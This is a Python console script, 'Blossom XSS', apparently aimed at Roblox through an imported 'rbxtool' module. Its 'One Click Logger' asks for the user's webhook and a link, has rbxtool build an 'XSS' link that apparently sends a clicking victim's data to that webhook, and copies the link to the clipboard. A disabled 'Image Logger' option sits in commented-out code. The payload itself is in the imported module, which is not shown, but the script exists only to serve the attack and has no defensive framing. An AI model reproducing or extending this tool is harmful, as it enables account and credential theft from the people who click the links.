import ctypes, colorama, os
ConsoleTitle = ctypes.windll.kernel32.SetConsoleTitleW
clear = lambda: os.system('cls')
from colorama import init, Fore, Back, Style
ver = 1.0
ConsoleTitle(f"Blossom // Checking for updates...")
clear()
print(f"""{Fore.MAGENTA}{Style.BRIGHT}

                   XXXX                    XXXX
     XXXX          XX  XX  XXXX        XXXX  XX
     XX  XXXX    XXXX  XXXX  XX    XXXX      XX{Fore.RESET}         Blossom XSS {Fore.RED}v{Fore.RESET}{ver}{Fore.MAGENTA}
     XX      XXXX  XX    XX    XXXX          XX{Fore.RED}         ----------------{Fore.MAGENTA}
     XX        XXXX        XX  XX          XX{Fore.RESET}           Written by{Fore.RED}: {Fore.RESET}Flights{Fore.MAGENTA}
       XX    XX                            XX{Fore.RESET}           Links{Fore.RED}: {Fore.RESET}solo.to/com{Fore.MAGENTA}
       XX  XX                            XX{Fore.RESET}             Source{Fore.RED}: {Fore.RESET}Open{Fore.MAGENTA}
       XX  XX                            XX{Fore.RED}             ----------------{Fore.MAGENTA}
         XXXX            XXXXXX        XXXX{Fore.RESET}             Checking for updates...{Fore.RED}{Fore.MAGENTA}
         XXXXXX    XXXXXX{Fore.RED}OOOO{Fore.MAGENTA}XX    XXXXXX  XX
       XXXX  {Fore.RED}OO      OO{Fore.BLACK}  {Fore.RED}OOOO{Fore.MAGENTA}XX    XXXXXX  XX
       XXXX{Fore.RED}OOOO      OOOOOO{Fore.MAGENTA}XXXXXXXX      XX  XX
     XX  XXXXXXXXXXXXXXXXXXXX  XX          XXXX
     XX  XXXX  XX      XX  XXXX              XXXX
     XX    XXXXXX      XX  XX    XXXX      XX    XX
       XXXXXX  XXXXXXXXXXXX          XXXXXXXX      XX
           XXXX                          XX        XX
             XXXX                        XX    XXXX
             XX  XXXXXXXX              XXXXXXXX
             XX      XX  XXXX          XX
               XXXXXX        XX      XX
                               XXXXXX{Fore.RESET}
             """)
ConsoleTitle(f"Blossom // Importing Libraries...")
import requests, time, random, rbxtool, cyphers
clear()
print(f"""{Fore.MAGENTA}{Style.BRIGHT}

                   XXXX                    XXXX
     XXXX          XX  XX  XXXX        XXXX  XX
     XX  XXXX    XXXX  XXXX  XX    XXXX      XX{Fore.RESET}         Blossom XSS {Fore.RED}v{Fore.RESET}{ver}{Fore.MAGENTA}
     XX      XXXX  XX    XX    XXXX          XX{Fore.RED}         ----------------{Fore.MAGENTA}
     XX        XXXX        XX  XX          XX{Fore.RESET}           Written by{Fore.RED}: {Fore.RESET}Flights{Fore.MAGENTA}
       XX    XX                            XX{Fore.RESET}           Links{Fore.RED}: {Fore.RESET}solo.to/com{Fore.MAGENTA}
       XX  XX                            XX{Fore.RESET}             Source{Fore.RED}: {Fore.RESET}Open{Fore.MAGENTA}
       XX  XX                            XX{Fore.RED}             ----------------{Fore.MAGENTA}
         XXXX            XXXXXX        XXXX{Fore.RESET}             Importing Libraries...{Fore.RED}{Fore.MAGENTA}
         XXXXXX    XXXXXX{Fore.RED}OOOO{Fore.MAGENTA}XX    XXXXXX  XX
       XXXX  {Fore.RED}OO      OO{Fore.BLACK}  {Fore.RED}OOOO{Fore.MAGENTA}XX    XXXXXX  XX
       XXXX{Fore.RED}OOOO      OOOOOO{Fore.MAGENTA}XXXXXXXX      XX  XX
     XX  XXXXXXXXXXXXXXXXXXXX  XX          XXXX
     XX  XXXX  XX      XX  XXXX              XXXX
     XX    XXXXXX      XX  XX    XXXX      XX    XX
       XXXXXX  XXXXXXXXXXXX          XXXXXXXX      XX
           XXXX                          XX        XX
             XXXX                        XX    XXXX
             XX  XXXXXXXX              XXXXXXXX
             XX      XX  XXXX          XX
               XXXXXX        XX      XX
                               XXXXXX{Fore.RESET}
             """)

def blossom():
    ConsoleTitle(f"Blossom // Running!")
    clear()
    print(f"""{Fore.MAGENTA}{Style.BRIGHT}

                     XXXX                    XXXX
       XXXX          XX  XX  XXXX        XXXX  XX
       XX  XXXX    XXXX  XXXX  XX    XXXX      XX{Fore.RESET}         Blossom XSS {Fore.RED}v{Fore.RESET}{ver}{Fore.MAGENTA}
       XX      XXXX  XX    XX    XXXX          XX{Fore.RED}         ----------------{Fore.MAGENTA}
       XX        XXXX        XX  XX          XX{Fore.RESET}           Written by{Fore.RED}: {Fore.RESET}Flights{Fore.MAGENTA}
         XX    XX                            XX{Fore.RESET}           Links{Fore.RED}: {Fore.RESET}solo.to/com{Fore.MAGENTA}
         XX  XX                            XX{Fore.RESET}             Source{Fore.RED}: {Fore.RESET}Open{Fore.MAGENTA}
         XX  XX                            XX{Fore.RED}             ----------------{Fore.MAGENTA}
           XXXX            XXXXXX        XXXX{Fore.RESET}             {Fore.RED}[{Fore.RESET}{Style.BRIGHT}1{Fore.RED}]{Fore.RESET}{Style.BRIGHT} One Click{Fore.RED}{Fore.MAGENTA}
           XXXXXX    XXXXXX{Fore.RED}OOOO{Fore.MAGENTA}XX    XXXXXX  XX           {Fore.RED}[{Fore.RESET}{Style.BRIGHT}2{Fore.RED}]{Fore.RESET}{Style.BRIGHT} Image Logger (DISABLED){Fore.RED}{Fore.MAGENTA}
         XXXX  {Fore.RED}OO      OO{Fore.BLACK}  {Fore.RED}OOOO{Fore.MAGENTA}XX    XXXXXX  XX
         XXXX{Fore.RED}OOOO      OOOOOO{Fore.MAGENTA}XXXXXXXX      XX  XX
       XX  XXXXXXXXXXXXXXXXXXXX  XX          XXXX
       XX  XXXX  XX      XX  XXXX              XXXX
       XX    XXXXXX      XX  XX    XXXX      XX    XX
         XXXXXX  XXXXXXXXXXXX          XXXXXXXX      XX
             XXXX                          XX        XX
               XXXX                        XX    XXXX
               XX  XXXXXXXX              XXXXXXXX
               XX      XX  XXXX          XX
                 XXXXXX        XX      XX
                                 XXXXXX{Fore.RESET}
               """)
    opt = int(input(f"""   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}INPUT{Fore.RED}{Style.BRIGHT}]{Fore.RESET} """))
    if opt == 1:
        ConsoleTitle(f"Blossom // One Click Logger")
        whook = input(f"""   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}INPUT{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} What is your Webhook{Fore.RED}{Style.BRIGHT}:{Fore.RESET} """)
        lnk = input(f"""   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}INPUT{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} What link would you like to use{Fore.RED}{Style.BRIGHT}:{Fore.RESET} """)
        print(f"   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}SYSTEM{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} Managing XSS{Fore.RED}{Style.BRIGHT}...{Fore.RESET}")
        rbxtool.oneclick(lnk, whook)
        print(f"   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}SYSTEM{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} XSS created {Fore.RED}{Style.BRIGHT}!{Fore.RESET}")
        print(f"   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}SYSTEM{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} Link has been copied to clipboard.")
        input(f"   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}SYSTEM{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} Press Enter to go back to Menu.")
        clear()
        blossom()
    elif opt == 2:
    	input(f"""   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}INPUT{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} Image Logger is temporarily down, press enter to return{Fore.RED}{Style.BRIGHT}:{Fore.RESET} """)
    	clear()
    	blossom()
        #ConsoleTitle(f"Blossom // Image Logger")
        #whook = input(f"""   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}INPUT{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} What is your Webhook{Fore.RED}{Style.BRIGHT}:{Fore.RESET} """)
        #imglnk = input(f"""   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}INPUT{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} What image link would you like to use{Fore.RED}{Style.BRIGHT}:{Fore.RESET} """)
        #print(f"   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}SYSTEM{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} Managing XSS{Fore.RED}{Style.BRIGHT}...{Fore.RESET}")
        #abcdefg.imagelogabcdefg(imglnk, whook)
        #print(f"   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}SYSTEM{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} Managing XSS{Fore.RED}{Style.BRIGHT}...{Fore.RESET}")
        #print(f"   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}SYSTEM{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} Image Saved to the folder Blossom is located in.")
        #input(f"   {Fore.RED}{Style.BRIGHT}[{Style.BRIGHT}{Fore.RESET}SYSTEM{Fore.RED}{Style.BRIGHT}]{Style.BRIGHT}{Fore.RESET} Press Enter to go back to Menu.")
    else:
        clear()
        blossom()

blossom()
